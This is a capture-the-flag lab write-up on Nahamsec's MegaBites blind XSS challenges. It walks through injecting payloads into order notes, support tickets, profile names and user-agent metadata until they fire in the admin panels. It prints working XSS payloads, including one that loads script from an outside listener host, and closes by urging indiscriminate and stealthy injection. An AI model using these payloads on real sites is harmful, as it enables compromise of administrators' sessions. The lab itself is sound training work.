# Nahamsec MegaBites Blind XSS Lab

## Scenario

We're provided with an ecommerce website with an option to register and login. It allows us to purchase some good foods with the names of the vulnerabilities. Along with that we're given 3 admin subdomains of the website with username and password as: `guest:password`.&#x20;

Three subdomains:&#x20;

* customer-orders-ops.
* customer-profile-ops.
* customer-support-ops.\


<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

## Blind XSS - 1

### Create an account&#x20;

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Purchase some foodies

On creating an account we directly get logged in. Now we can purchase some foodies.&#x20;

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

On clicking checkout we're given the option to add the delivery address, payment information and delivery notes. We can see that the delivery notes is in the textarea field. Thus trying to add payload everywhere.&#x20;

### Enter payload

**Payload used**: `';"/></div></textarea></noscript><script/src=//crazy.ezxss.com/`

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

On clicking the `Place Order` button it is just giving a message stating that the order has been placed.&#x20;

### Update account information

No symbol of javascript execution yet. Although we've entered our blind XSS payload thus we need to check in our blind XSS manager tool. But not any trigger yet. Let's check the manage account section of the user.&#x20;

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

Here we can see that all the information that user has entered while registration/order placing is reflecting back. Let's check inserting payload in it one by one. But everything is encoded for the name field.&#x20;

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

### Triggering the XSS

Let's go to one of the admin panel which is `customer-profile-ops.iolite.ctfio.com/login`.&#x20;

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

We can see the users list there. But one interesting thing is we're finding some characters ahead of our username. This might be an indicator that an XSS is triggered and boom 💣💥. We've an XSS vulnerability triggered successfully on our blind xss manager.&#x20;

### XSS triggered

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

Note that we've given access to admin panel for demonstration purpose. In real life we've to assume everything about the behind scenario and enter the payload accordingly. Let's have a close look at our payload.

⇒  `';"/></div></textarea></noscript><script/src=//crazy.ezxss.com/`&#x20;

* The `';"/>` is used to close any remaining open tag where our javascript is injected.&#x20;
* The `</div></textarea></noscript>` is used to close the respective tags if it is there.&#x20;
* Note that we've not closed the `<script/src`. Because there are chances that opening and closing brackets get alert by the WAF. That's why we've left it open as `<script/src=//crazy.ezxss.com/`&#x20;

Analysing the source code of `customer-profile-ops` we can see that the XSS is actually triggered in the users list that we've seen before. That's why our mail was not listed therein.&#x20;

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

## Blind XSS - 2

### Understanding the functionality

It seems like we can create a support ticket as well under the `Manage Account` section. Let's check it.&#x20;

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

Let's try the same payload here because here too the message is written in the textarea field.&#x20;

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

### XSS triggered on client side

The support ticket is created successfully but XSS is not yet triggered in the blind XSS manager. But on clicking the created support ticket we successfully triggerred an XSS. Since it is on client side let's try to bring a popup using payload: `';"/></div></textarea></noscript><img/src=x onerror=alert(1)/>`

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

We can see our tickets. Now let's trigger XSS by clicking on second support ticket.&#x20;

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

### Checking blind xss on admin panel

Let's check one of the admin panel which is for customer support operation.&#x20;

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

We can see several support tickets created herein. Let's open and check all.&#x20;

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

### Checking source code (admin panel)

But even though payload is there we didn't find any XSS triggered. Let's check the source code.&#x20;

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

### Analyzing the reason for failure

On analyzing the source code we can identify that everything is encoded that's why our XSS is not triggered here. But we can see something like this at the end of the source code.&#x20;

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

### Found another context to trigger XSS

Let's try to break that context and execute our XSS. Thus we update the name in the manage section with this payload: `holadaaru'; alert(2);//`. But we need to create a new support ticket for that. Let's create one. And boom 💣💥. The blind XSS is triggered on the admin panel.&#x20;

<figure><img src="../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

On deeply understanding the source code we can identify that on clicking the respond button within each support ticket contains that javascript to respond as "Hello $username".&#x20;

{% hint style="info" %}
_In blind XSS you never know where your payload will trigger. Here we're given the admin access that's why we're able to read it's source code, analyze it and create our payload thoroughly that is working. In real life you've to understand all these contexts and create a payload list with blind XSS manager and fuzz it on the website. Because you don't know which one might work._&#x20;
{% endhint %}

## Blind XSS - 3&#x20;

### Checking the admin panel

It's time to navigate to our 3rd admin panel which is `customer-orders-ops`. We can see a list of orders that various users has ordered.&#x20;

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

### XSS trigerred (even without payload)

Let's check our order. On checking our order we've successfully triggered an XSS. But wait from where it is triggered. Let's check it out.&#x20;

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

### Finding the reason behind it

On analyzing the DOM in the blind XSS manager and in the admin panel as well we can see that it is triggered from the Delivery Notes in which we've left a blind XSS payload while ordering in case `Blind XSS - 1`.&#x20;

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

## Blind XSS - 4

### Checking the order list again

Carefully checking the order list again in the admin panel we can see that there is a `Customer Meta Data` section.&#x20;

<figure><img src="../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

### Let's check it out

Ops. They are fingerprinting the user. But what if the user is an attacker and he injects payload there. Let's see.&#x20;

<figure><img src="../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

### Add match and replace rule and order again

<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

### Checking the admin panel again&#x20;

<figure><img src="../../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

### XSS triggered

&#x20;On clicking the customer metadata we successfully triggered an XSS.&#x20;

<figure><img src="../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

## Final Takeaway&#x20;

* **Blind XSS is unpredictable** — you never know _where_ or _when_ your payload will trigger, so persistence and patience are crucial.
* **Input is your only weapon** — any user-controllable vector (headers, form fields, URLs, cookies, etc.) can become an injection point.
* **Context determines execution** — payload success entirely depends on how and where your input is reflected in the backend application.
* **Never assume reflection location** — unlike reflected XSS, in blind XSS you rarely see the output; always consider multiple reflection contexts.
* **Build context-aware payloads** — craft payloads for every major HTML/JS context (attributes, tags, JS strings, inline handlers, comments, etc.).
* **Avoid static payloads** — no single “master payload” exists; dynamic, modular payloads tailored to context yield higher success.
* **Fingerprint resistance** — some applications sanitize or fingerprint user agents; design stealthy, minimal payloads that survive sanitization.
* **Focus on script execution, not alerts** — whether you use `alert(1)` or call your blind XSS listener endpoint, the goal is successful code execution.
* **Context chaining** — learn to “break out” from the existing context (`';"/>`) before executing code — a universal approach across HTML/JS surfaces.
* **JavaScript context awareness** — if reflection occurs inside JS variables, you must adapt syntax to escape the string before injecting code.
* **Assume restricted visibility** — in real-world cases, you won’t have access to the admin panel or source; rely on inference and behavioral patterns.
* **Leverage assumption & deduction** — predict reflection points logically based on user flows, form behavior, or response timing.
* **Track injection surfaces systematically** — note every location your input travels (headers, JSON, HTML, logs, tickets) for later correlation.
* **Use a custom blind XSS manager** — automate payload callbacks, screenshot collection, and event logging for proof-of-execution.
* **Patience differentiates experts from beginners** — blind XSS often takes days or weeks; persistence and methodical testing are key.
* **Learn from behavior, not feedback** — monitor subtle response patterns, timing differences, or access logs instead of expecting visual output.
* **Understand developer logic** — knowing where data is stored or rendered server-side helps predict where your payload may execute.
* **MegaBites’ true lesson** — the goal isn’t to find one payload that works everywhere, but to develop the mindset to _adapt, hypothesize, and refine_.
* **Payload Versatility:** Develop polyglot payloads tailored to diverse contexts (HTML attributes, JavaScript variables, CSS, etc.) and inject them indiscriminately across all client-side inputs—headers, forms, URLs, cookies—to maximize blind execution chances without prior visibility.
